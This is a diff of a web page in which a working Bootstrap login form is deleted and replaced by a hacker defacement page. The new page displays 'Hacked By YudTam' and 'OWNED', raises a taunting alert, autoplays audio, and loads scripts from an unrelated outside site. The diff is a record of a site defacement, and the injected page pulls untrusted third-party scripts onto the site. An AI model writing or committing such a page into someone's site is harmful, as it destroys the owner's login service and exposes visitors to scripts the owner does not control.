@@ -1,69 +1,34 @@
-<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
-<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-<!------ Include the above in your HEAD tag ---------->
-
-<!DOCTYPE html>
 <html>
 <head>
-	<title>Login Page</title>
-   <!--Made with love by Mutiullah Samim -->
-   
-	<!--Bootsrap 4 CDN-->
-	<link rel="stylesheet" href="min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
-    
-    <!--Fontawesome CDN-->
-	<link rel="stylesheet" href="all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous">
-
-	<!--Custom styles-->
-	<link rel="stylesheet" type="text/css" href="login.css">
+<title>Hack Web</title>
+<font class="hk2" style="text-shadow: 1px -1px 8px;" face="tahoma">
+<font color="grey">
+<font size="5">
+<link rel='stylesheet' id'skebggallery-css' href='http://shop4brides.ru/wp-content/themes/irex-lite/SketchBoard/functions/sketch-background-gallery/inc/front/css/skebggallery.css?ver=4.0.1' type='text/css' media='all' />
+			  <script type='text/javascript' src='http://shop4brides.ru/wp-includes/js/jquery/jquery.js?ver=1.11.1'></script>
+              <script type='text/javascript' src='http://shop4brides.ru/wp-content/themes/irex-lite/SketchBoard/functions/sketch-background-gallery/inc/front/js/skebggallery.js?ver=4.0.1'></script> 
+			  <style> .error { text-align: center; font-family: 'Gilda Display', serif; -webkit-animation: noise-3 1s linear infinite; animation: noise-3 1s linear infinite; overflow: default; } .info { text-align: center; width: 200px; height: 60px; margin: auto; position: absolute; top: 280px; bottom: 0; left: 20px; right: 0; -webkit-animation: noise-3 1s linear infinite; animation: noise-3 1s linear infinite; } .info:after { content: 'OWNED'; font-family: OCR-A; font-size: 100px; text-align: center; width: 800px; margin: auto; position: absolute; top: 20px; bottom: 0; left: 40px; right: 0; opacity: 0; color: white; -webkit-animation: noise-1 .2s linear infinite; animation: noise-1 .2s linear infinite; } @-webkit-keyframes noise-1 { 0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;} 10% {opacity: .1;} 50% {opacity: .5; left: -6px;} 80% {opacity: .3;} 100% {opacity: .6; left: 2px;} } @keyframes noise-1 { 0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;} 10% {opacity: .1;} 50% {opacity: .5; left: -6px;} 80% {opacity: .3;} 100% {opacity: .6; left: 2px;} } @-webkit-keyframes noise-2 { 0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;} 10% {opacity: .1;} 50% {opacity: .5; left: 6px;} 80% {opacity: .3;} 100% {opacity: .6; left: -2px;} } @keyframes noise-2 { 0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;} 10% {opacity: .1;} 50% {opacity: .5; left: 6px;} 80% {opacity: .3;} 100% {opacity: .6; left: -2px;} } @-webkit-keyframes noise { 0%, 3%, 5%, 42%, 44%, 100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);} 4.3% {opacity: 1; -webkit-transform: scaleY(1.7); transform: scaleY(1.7);} 43% {opacity: 1; -webkit-transform: scaleX(1.5); transform: scaleX(1.5);} } @keyframes noise { 0%, 3%, 5%, 42%, 44%, 100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);} 4.3% {opacity: 1; -webkit-transform: scaleY(1.7); transform: scaleY(1.7);} 43% {opacity: 1; -webkit-transform: scaleX(1.5); transform: scaleX(1.5);} } @-webkit-keyframes noise-3 { 0%,3%,5%,42%,44%,100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);} 4.3% {opacity: 1; -webkit-transform: scaleY(4); transform: scaleY(4);} 43% {opacity: 1; -webkit-transform: scaleX(10) rotate(60deg); transform: scaleX(10) rotate (60deg);} } @keyframes noise-3 { 0%,3%,5%,42%,44%,100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);} 4.3% {opacity: 1; -webkit-transform: scaleY(4); transform: scaleY(4);} 43% {opacity: 1; -webkit-transform: scaleX(10) rotate(60deg); transform: scaleX(10) rotate (60deg);} } .wrap { top: 30%; left: 25%; height: 200px; margin-top: -100px; position: absolute; } code { color: white; } span.blue { color: #48beef; } span.comment { color: #7f8c8d; } span.orange { color: #f39c12; } span.green { color: #33cc33; } .viewFull { font-family:OCR-A; color:orange; text-decoration:; } 	 } @media only screen and (min-height: 500px) { .viewFull{ display:none; 	 	} } 	</style> <center> <style> img { filter:alpha(opacity=70); -moz-opacity:0.7; opacity:0.7; } img:hover { filter:alpha(opacity=100); -moz-opacity:.0; opacity:1.0; } </style>
+			   <link href="https://fonts.googleapis.com/css?family=Chicle|Yatra+One" rel="stylesheet" type="text/css" >
+<script>
+alert("Y0UR 5Y5T3M 15 N0T 54VE!");
+</script>
 </head>
-
-<body>
-<div class="container">
-	<div class="d-flex justify-content-center h-100">
-		<div class="card">
-			<div class="card-header">
-				<h3>Sign In</h3>
-				<div class="d-flex justify-content-end social_icon">
-					<span><i class="fab fa-facebook-square"></i></span>
-					<span><i class="fab fa-google-plus-square"></i></span>
-					<span><i class="fab fa-twitter-square"></i></span>
-				</div>
-			</div>
-			<div class="card-body">
-				<form method="post" action="login1.php">
-					<div class="input-group form-group">
-						<div class="input-group-prepend">
-							<span class="input-group-text"><i class="fas fa-user"></i></span>
-						</div>
-						<input type="text" class="form-control" placeholder="ID" name="id">
-						
-					</div>
-					<div class="input-group form-group">
-						<div class="input-group-prepend">
-							<span class="input-group-text"><i class="fas fa-key"></i></span>
-						</div>
-						<input type="password" class="form-control" placeholder="password" name="password">
-					</div>
-					<div class="row align-items-center remember">
-						<input type="checkbox">Remember Me
-					</div>
-					<div class="form-group">
-						<input type="submit" value="Login" class="btn float-right login_btn">
-					</div>
-				</form>
-			</div>
-			<div class="card-footer">
-				<div class="d-flex justify-content-center links">
-					Don't have an account?<a href="#">Sign Up</a>
-				</div>
-				<div class="d-flex justify-content-center">
-					<a href="#">Forgot your password?</a>
-				</div>
-			</div>
-		</div>
-	</div>
-</div>
+<body bgcolor=black>
+<script type="text/javascript" src="http://htmlfreecodes.com/codes/rain.js"></script><br><div class="error">
+<font color="red" size="7" face="Chicle">Hacked By YudTam
+<center>
+</font><br>
+<img style="width:50%" src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTI6mtult_OQuampH5qrY9jTCvTmSC9cNPOV2htUmzPQ2jIukSn"></div>
+<font color=green>
+<br>
+<b><font face="courier new" size='6'>Kami Hanyalah <br> Manusia Biasa Yang Ingin Belajar Dan Berkarya <br> Thanks:)
+<marquee behavior="scroll" direction="left" scrollamount="90" scrolldelay="40" width="100%">
+<font color="green">___________________________________________________________</font></marquee>
+<div style="text-shadow: 0px 0px 10px green;"><span style="color: white;"><font face="transformers"><b>Thanks To : <marquee scrollamount="5" direction="left" width="50%"><span style="color: red;"> <span style="color: red;">YudTam<span style="color: red;"></b></marquee></font></div><script type="text/rocketscript">/*<![CDATA[*/new TypingText(document.getElementById("message"), 90, function(i){ var ar= new Array("_", " ", "_", " "); return "" +ar[i.length % ar.length]; });//Type out examples:TypingText.runAll();/*]]>*/</script>
+<marquee behavior="scroll" direction="right" scrollamount="90" scrolldelay="40" width="100%">
+<font color="green">___________________________________________________________</font></marquee>
 </body>
 </html>
+<center>
+<audio autoplay="autoplay" controls="controls" src="https://api.soundcloud.com/tracks/502901445/stream?client_id=a3e059563d7fd3372b49b37f00a00bcf" type="audio/mpeg"></audio>
+</center>
